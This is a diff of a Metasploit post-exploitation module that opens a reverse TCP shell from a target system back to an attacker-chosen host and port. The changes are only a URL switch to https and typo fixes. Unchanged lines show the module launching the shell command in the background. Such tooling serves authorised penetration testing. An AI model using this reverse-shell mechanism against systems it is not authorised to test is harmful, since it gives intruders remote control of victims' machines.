@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Post
         'Name'          => 'Multi Manage System Remote TCP Shell Session',
         'Description'   => %q{
           This module will create a Reverse TCP Shell on the target system
-          using the system own scripting enviroments installed on the
+          using the system's own scripting environments installed on the
           target.
         },
         'License'       => MSF_LICENSE,
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Post
     end
 
     if not cmd.empty?
-      print_status("Executing reverse tcp shel to #{lhost} on port #{lport}")
+      print_status("Executing reverse tcp shell to #{lhost} on port #{lport}")
       cmd_exec("(#{cmd} &)")
     end
   end
